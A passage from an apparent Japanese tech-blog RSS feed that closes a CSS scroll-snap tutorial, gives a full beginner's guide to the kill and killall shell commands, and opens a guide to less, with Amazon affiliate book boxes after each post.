&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>scroll-snap-type&lt;/code>の値として&lt;code>x&lt;/code>を使用したことに注意してください。スナップの厳密さは、デフォルトでは&lt;code>proximity&lt;/code>になります。&lt;/p>
&lt;script async src="//jsfiddle.net/wyoshi/d3azwnjr/embed/result,html,css/">&lt;/script>
&lt;h3 id="友達リスト">友達リスト&lt;/h3>
&lt;p>スクロールスナップのもう1つの優れた使用例として、友達のリストがあります。以下の例は、Facebookから引用したものです（実例）。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 224;
flex-basis: 538px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-14-01-wyoshi/use-case-2.png" data-size="980x437">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-14-01-wyoshi/use-case-2.png"
width="980"
height="437"
loading="lazy"
alt="CSSでアプリのようにピタッとスナップするスクロールを作成の画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-css" data-lang="css">&lt;span class="p">.&lt;/span>&lt;span class="nc">list&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">display&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">flex&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">overflow-x&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">auto&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">scroll-snap-type&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">x&lt;/span> &lt;span class="kc">mandatory&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">gap&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="kt">rem&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">scroll-padding&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">48&lt;/span>&lt;span class="kt">px&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">padding-bottom&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">32&lt;/span>&lt;span class="kt">px&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="kp">-webkit-&lt;/span>&lt;span class="n">overflow-scrolling&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">touch&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">.&lt;/span>&lt;span class="nc">list-item&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">scroll-snap-align&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">start&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>スクロールするコンテナーにはpadding-bottomがあることに注意してください。32pxです。この目的は、ボックスシャドウが期待どおりに表示されるように余分なスペースを提供することです。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 224;
flex-basis: 538px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-14-01-wyoshi/use-case-2-2.png" data-size="980x437">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-14-01-wyoshi/use-case-2-2.png"
width="980"
height="437"
loading="lazy"
alt="CSSでアプリのようにピタッとスナップするスクロールを作成の画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;h3 id="アバターリスト">アバターリスト&lt;/h3>
&lt;p>今回の使用例では、子アイテムの&lt;code>scroll-snap-align&lt;/code>の値として&lt;code>center&lt;/code>を使用しています。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 148;
flex-basis: 355px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-14-01-wyoshi/use-case-4.png" data-size="980x661">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-14-01-wyoshi/use-case-4.png"
width="980"
height="661"
loading="lazy"
alt="CSSでアプリのようにピタッとスナップするスクロールを作成の画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-css" data-lang="css">&lt;span class="p">.&lt;/span>&lt;span class="nc">list&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">display&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">flex&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">overflow-x&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">auto&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">scroll-snap-type&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">x&lt;/span> &lt;span class="kc">mandatory&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="kp">-webkit-&lt;/span>&lt;span class="n">overflow-scrolling&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">touch&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">.&lt;/span>&lt;span class="nc">list-item&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">scroll-snap-align&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">center&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>これはアバターのリストで、アバターがスクロールするコンテナーの中央にあることが重要な場合に便利です。&lt;/p>
&lt;script async src="//jsfiddle.net/wyoshi/d3azwnjr/2/embed/result,html,css/">&lt;/script>
&lt;h3 id="全画面を覆うような要素">全画面を覆うような要素&lt;/h3>
&lt;p>スクロールスナップの使用は、縦スクロールの場合にも有効です。この例として、フルハイトのセクションがあります。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 157;
flex-basis: 378px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-14-01-wyoshi/use-case-3.png" data-size="980x621">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-14-01-wyoshi/use-case-3.png"
width="980"
height="621"
loading="lazy"
alt="CSSでアプリのようにピタッとスナップするスクロールを作成の画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-html" data-lang="html">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">main&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">section&lt;/span> &lt;span class="na">class&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;section section-1&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&amp;lt;/&lt;/span>&lt;span class="nt">section&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">section&lt;/span> &lt;span class="na">class&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;section section-2&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&amp;lt;/&lt;/span>&lt;span class="nt">section&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">section&lt;/span> &lt;span class="na">class&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;section section-3&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&amp;lt;/&lt;/span>&lt;span class="nt">section&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">section&lt;/span> &lt;span class="na">class&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;section section-4&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&amp;lt;/&lt;/span>&lt;span class="nt">section&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">section&lt;/span> &lt;span class="na">class&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;section section-5&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&amp;lt;/&lt;/span>&lt;span class="nt">section&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">main&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-css" data-lang="css">&lt;span class="nt">main&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">height&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">100&lt;/span>&lt;span class="kt">vh&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">overflow-y&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">auto&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">scroll-snap-type&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">y&lt;/span> &lt;span class="kc">mandatory&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="kp">-webkit-&lt;/span>&lt;span class="n">overflow-scrolling&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">touch&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">.&lt;/span>&lt;span class="nc">section&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">height&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">100&lt;/span>&lt;span class="kt">vh&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">scroll-snap-align&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">start&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;script async src="//jsfiddle.net/wyoshi/d3azwnjr/4/embed/result,html,css/">&lt;/script>
&lt;h2 id="ブロックおよびインラインの値">ブロックおよびインラインの値&lt;/h2>
&lt;p>特筆すべきは、&lt;code>scroll-snap-type&lt;/code>に&lt;code>inline&lt;/code>と&lt;code>block&lt;/code>という論理値を使用できることです。以下の例を参照してください。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-css" data-lang="css">&lt;span class="nt">main&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">scroll-snap-type&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">inline&lt;/span> &lt;span class="kc">mandatory&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>この例では、英語のような横書きモードでは、&lt;code>inline&lt;/code>が横方向の寸法を表します。日本語のような言語では、&lt;code>inline&lt;/code>は縦方向の寸法を表すことになります。&lt;br>
CSSの論理プロパティについてもっと知りたい方は、&lt;a class="link" href="https://adrianroselli.com/2019/11/css-logical-properties.html" target="_blank" rel="noopener"
>Adrian Roselliの記事&lt;/a> をご覧ください。&lt;/p>
&lt;h2 id="アクセシビリティ">アクセシビリティ&lt;/h2>
&lt;p>CSSスクロールスナップを使用する際は、アクセシビリティを確保すること。ここでは、ユーザーがコンテンツを自由にスクロールして読むことを妨げる、スクロールスナップの悪い使い方を紹介します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-css" data-lang="css">&lt;span class="p">.&lt;/span>&lt;span class="nc">wrapper&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">scroll-snap-type&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">y&lt;/span> &lt;span class="kc">mandatory&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nt">h2&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">scroll-snap-align&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">start&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 181;
flex-basis: 434px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-14-01-wyoshi/use-case-5.png" data-size="980x541">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-14-01-wyoshi/use-case-5.png"
width="980"
height="541"
loading="lazy"
alt="CSSでアプリのようにピタッとスナップするスクロールを作成の画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;p>デモのような実装は絶対にしないでください。&lt;/p>
&lt;script async src="//jsfiddle.net/wyoshi/d3azwnjr/6/embed/result/">&lt;/script>
&lt;h2 id="まとめ">まとめ&lt;/h2>
&lt;p>以上が&lt;code>scroll-snap&lt;/code>機能についてになります。今までスナップするスクロールを実装する場合はjsを使用していましたが、cssのみで実装可能となると簡単になりますね。&lt;/p>
&lt;h2 id="オススメの書籍">オススメの書籍&lt;/h2>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/HTML5-CSS3-%e3%83%87%e3%82%b6%e3%82%a4%e3%83%b3%e3%83%ac%e3%82%b7%e3%83%94%e9%9b%86-%e7%8b%a9%e9%87%8e-%e7%a5%90%e6%9d%b1/dp/4774187801/?tag=nlpqueens-22" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://images-fe.ssl-images-amazon.com/images/I/51Xd7nz7WbL.jpg" alt=" HTML5 &amp;amp; CSS3 デザインレシピ集 ">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name"> HTML5 &amp;amp; CSS3 デザインレシピ集 &lt;/h2>
&lt;p> 本書は、HTML5とCSS3によるWebサイト制作のための&amp;#34;おいしい&amp;#34;レシピ集です。 制作の現場で使われる定番テクニックから、プロ技まで余すところなく集めました。 テキスト/リスト/リンク/画像/ボックス/ テーブル/フォーム/ナビゲーション/ レイアウト/レスポンシブWebデザイン… テーマ別にレシピを整理しているので、引きやすくなっています。 「あのデザインはどう作るんだろう?」が、スグにわかります。 デザイナーからWebプログラマーまで、Web制作に携わるすべての方にお届けします。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/HTML5%ef%bc%8bCSS3%e3%81%ae%e6%96%b0%e3%81%97%e3%81%84%e6%95%99%e7%a7%91%e6%9b%b8-%e6%94%b9%e8%a8%82%e6%96%b0%e7%89%88-%e5%9f%ba%e7%a4%8e%e3%81%8b%e3%82%89%e8%a6%9a%e3%81%88%e3%82%8b%e3%80%81%e6%b7%b1%e3%81%8f%e7%90%86%e8%a7%a3%e3%81%a7%e3%81%8d%e3%82%8b%e3%80%82-%e8%b5%a4%e9%96%93-%e5%85%ac%e5%a4%aa%e9%83%8e-ebook/dp/B07GPH7R3Y/?tag=nlpqueens-22" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41eG3HJF4pL.jpg" alt=" HTML5＋CSS3の新しい教科書　改訂新版　基礎から覚える、深く理解できる。 ">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name"> HTML5＋CSS3の新しい教科書　改訂新版　基礎から覚える、深く理解できる。 &lt;/h2>
&lt;p> この商品は固定レイアウトで作成されており、タブレットなど大きいディスプレイを備えた端末で読むことに適しています。また、文字列のハイライトや検索、辞書の参照、引用などの機能が使用できません。 〈電子書籍版に関する注意事項〉 本書は固定レイアウト型の電子書籍です。リフロー型と異なりビューア機能が制限されるほか、端末によって見え方が異なりますので、ご購入前にお使いの端末にて「無料サンプル」をお試しください。 【技術の進化に左右されないWebサイトの作り方がわかる！】 Web制作のプロを目指す方に向けて、HTML5&amp;#43;CSS3を使ったWebサイトの作り方を解説した入門書の改訂版。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside></description></item><item><title>（７）【kill】シェルスクリプトコマンド活用紹介</title><link>https://suzukiiichiro.github.io/posts/2022-02-14-01-kill-suzuki/</link><pubDate>Mon, 14 Feb 2022 11:39:03 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-02-14-01-kill-suzuki/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-14-01-kill-suzuki/bash.jpg" alt="Featured image of post （７）【kill】シェルスクリプトコマンド活用紹介" />&lt;h2 id="killコマンド">killコマンド&lt;/h2>
&lt;ul>
&lt;li>killコマンドでプロセスIDを指定してプロセスを終了させる&lt;/li>
&lt;li>killallコマンドで名前を指定してプロセスを終了させる&lt;/li>
&lt;/ul>
&lt;h2 id="killコマンド概要">killコマンド概要&lt;/h2>
&lt;p>プロセスを強制終了させます。&lt;br>
killは実行中のプロセスを終了させる場合に使うコマンドです。&lt;/p>
&lt;p>killコマンドでプロセスを終了させるには、&lt;/p>
&lt;pre tabindex="0">&lt;code>$ kill ＜プロセスID＞
&lt;/code>&lt;/pre>&lt;p>で指定します。&lt;br>
例えば、100番のプロセスならば&lt;/p>
&lt;pre tabindex="0">&lt;code>$ kill 100
&lt;/code>&lt;/pre>&lt;p>と指定します。&lt;br>
プロセスIDは「ps」コマンドで調べることができます。&lt;/p>
&lt;h2 id="killコマンドの書式">killコマンドの書式&lt;/h2>
&lt;p>kill [オプション] プロセスID&lt;/p>
&lt;h2 id="killコマンドの主なオプション">killコマンドの主なオプション&lt;/h2>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>オプション&lt;/th>
&lt;th>意味&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>-s シグナル&lt;/td>
&lt;td>プロセスに送るシグナル名または番号。-シグナル名、-番号でも指定可能&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>-l&lt;/td>
&lt;td>シグナル名のリストを表示する&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h2 id="killコマンド詳細説明">killコマンド詳細説明&lt;/h2>
&lt;h3 id="プロセスｉｄでプロセスを終了させる">プロセスＩＤでプロセスを終了させる&lt;/h3>
&lt;p>「kill プロセスID」で、指定したプロセスを終了させることができます。プロセスIDは「ps」コマンドで確認できます。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ kill ＜プロセスＩＤ＞
&lt;/code>&lt;/pre>&lt;h3 id="killallコマンドで名前を指定してプロセスを終了させる">killallコマンドで名前を指定してプロセスを終了させる&lt;/h3>
&lt;p>「killall 名前」で、“名前”に指定したプロセスを終了させることができます。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ killall ＜プロセス名＞
&lt;/code>&lt;/pre>&lt;h3 id="さまざまなプロセスの調べ方と終了方法">さまざまなプロセスの調べ方と終了方法&lt;/h3>
&lt;p>ps aux を使う方法&lt;/p>
&lt;pre tabindex="0">&lt;code>bash-5.1$ ps axu | grep hugo | grep -v grep
suzukiiichiro 17498 0.0 3.4 5607088 567104 s003 S+ 水11AM 2:58.60 hugo -D server
suzukiiichiro 20710 0.0 1.7 5328588 286744 s005 S+ 11:38AM 0:13.50 hugo server
bash-5.1$
&lt;/code>&lt;/pre>&lt;p>最後の grep -v grep は、grep コマンドでプロセス名を検索したプロセスを除くという意味になります。&lt;/p>
&lt;p>さらにawkコマンドでプロセスＩＤを抽出します。&lt;/p>
&lt;pre tabindex="0">&lt;code>bash-5.1$ ps axu | grep hugo | grep -v grep | awk '{ print $2; }'
17498
20710
bash-5.1$
&lt;/code>&lt;/pre>&lt;p>pgrep を使う方法&lt;br>
pgrep は、指定したプロセスのプロセスＩＤを抽出する方法です。&lt;/p>
&lt;pre tabindex="0">&lt;code>bash-5.1$ pgrep hugo
17498
20710
bash-5.1$
&lt;/code>&lt;/pre>&lt;p>プロセスＩＤが解ったところでプロセスを終了します。&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th style="text-align:center">表記&lt;/th>
&lt;th style="text-align:center">数値&lt;/th>
&lt;th>意味&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td style="text-align:center">KILL&lt;/td>
&lt;td style="text-align:center">9&lt;/td>
&lt;td>プロセスの強制終了命令&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;pre tabindex="0">&lt;code>$ kill -9 17498
$ kill -9 20710
&lt;/code>&lt;/pre>&lt;p>面倒ですね。プロセスがたくさんある場合はとても煩雑です。&lt;br>
xargsコマンドを使うと一片にプロセスを終了させることができます。&lt;/p>
&lt;pre tabindex="0">&lt;code>bash-5.1$ ps axu | grep hugo | grep -v grep | awk '{ print $2; }' | xargs kill -9
&lt;/code>&lt;/pre>&lt;p>終了したいプロセス名が解っている場合は以下のコマンドで一発で全ての同名プロセスを終了させることができます。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ killall hugo
&lt;/code>&lt;/pre>&lt;h2 id="書籍の紹介">書籍の紹介&lt;/h2>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4873112672/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4873112672&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=ef087fd92d3628bb94e1eb10cb202d43" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51EAPCH56ML._SL250_.jpg" alt="詳解 シェルスクリプト 大型本 – 2006/1/16">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">詳解 シェルスクリプト 大型本 – 2006/1/16&lt;/h2>
&lt;p>Unixのプログラムは「ツール」と呼ばれます。
Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。
そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。
また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。
つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。
本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。
標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、
目的の処理を実現するための方法を詳しく学ぶことができます。
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797377623/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797377623&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=3c8d4566263ae99374221c4f8f469154" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51R5SZKrEAL._SL250_.jpg" alt="UNIXシェルスクリプト マスターピース132">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">UNIXシェルスクリプト マスターピース132&lt;/h2>
&lt;p>すべてのUNIXエンジニア必携!!
&lt;p>サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。&lt;br>
知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4774186945/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4774186945&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=8ef3ff961c569212e910cf3d6e37dcb6" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41i956UyusL._SL250_.jpg" alt="[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20&lt;/h2>
&lt;p>定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。
シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。
本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、
基本から丁寧に解説。
第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。
合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。
ますますパワーアップした改訂版をお届けします。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797393106/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797393106&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=f514a6378c1c10e59ab16275745c2439" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41d1D6rgDiL._SL250_.jpg" alt="新しいシェルプログラミングの教科書 単行本">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">新しいシェルプログラミングの教科書 単行本&lt;/h2>
&lt;p>エキスパートを目指せ!!
&lt;p>システム管理やソフトウェア開発など、&lt;br>
実際の業務では欠かせないシェルスクリプトの知識を徹底解説&lt;/p>
&lt;p>ほとんどのディストリビューションでデフォルトとなっているbashに特化することで、&lt;br>
類書と差別化を図るとともに、より実践的なプログラミングを紹介します。&lt;br>
またプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。&lt;br>
イマドキのエンジニア必携の一冊。&lt;/p>
&lt;p>▼目次&lt;br>
CHAPTER01 シェルってなんだろう&lt;br>
CHAPTER02 シェルスクリプトとは何か&lt;br>
CHAPTER03 シェルスクリプトの基本&lt;br>
CHAPTER04 変数&lt;br>
CHAPTER05 クォーティング&lt;br>
CHAPTER06 制御構造&lt;br>
CHAPTER07 リダイレクトとパイプ&lt;br>
CHAPTER08 関数&lt;br>
CHAPTER09 組み込みコマンド&lt;br>
CHAPTER10 正規表現と文字列&lt;br>
CHAPTER11 シェルスクリプトの実行方法&lt;br>
CHAPTER12 シェルスクリプトのサンプルで学ぼう&lt;br>
CHAPTER13 シェルスクリプトの実用例&lt;br>
CHAPTER14 テストとデバッグ&lt;br>
CHAPTER15 読みやすいシェルスクリプト&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside></description></item><item><title>（6）【less】シェルスクリプトコマンド活用紹介</title><link>https://suzukiiichiro.github.io/posts/2022-02-13-01-less-suzuki/</link><pubDate>Sun, 13 Feb 2022 16:35:49 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-02-13-01-less-suzuki/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-13-01-less-suzuki/bash.jpg" alt="Featured image of post （6）【less】シェルスクリプトコマンド活用紹介" />&lt;h2 id="lessコマンド">lessコマンド&lt;/h2>
&lt;ul>
&lt;li>テキストを1画面ずつ表示する&lt;/li>
&lt;li>キー操作のヘルプを表示する&lt;/li>
&lt;li>長い行を折り返さずに表示する&lt;/li>
&lt;li>ファイルの末尾まで表示したらすぐに終了する&lt;/li>
&lt;/ul>
&lt;h2 id="概要">概要&lt;/h2>
&lt;p>「less」コマンドは、テキストファイルを1画面ずつ表示するコマンドです。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ cat ＜ファイル名＞ | less
&lt;/code>&lt;/pre>&lt;p>「less ファイル名」で実行する他、「コマンド | less」のように、別のコマンドの実行結果を1画面ずつ表示する場合にも使われます。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ dmesg | less
&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>［Enter］キーで1行、スペースキーで1画面先に進める他、上下矢印キーによるスクロールも可能です。表示を終了するには［Q］または［q］キーを入力します。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;p>　同じ用途のコマンドに「more」があります。lessコマンドはmoreコマンドよりも機能が多く、画面内で検索したり、上にスクロールしたりすることが可能です。&lt;/p>
&lt;h2 id="lessコマンドの書式">lessコマンドの書式&lt;/h2>
&lt;p>less [オプション] ファイル名&lt;br>
コマンド | less [オプション]&lt;/p>
&lt;h2 id="lessコマンドの主なオプション">lessコマンドの主なオプション&lt;/h2>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th style="text-align:center">短いオプション&lt;/th>
&lt;th>長いオプション&lt;/th>
&lt;th>意味&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td style="text-align:center">+行数,-行数&lt;/td>
&lt;td>&lt;/td>
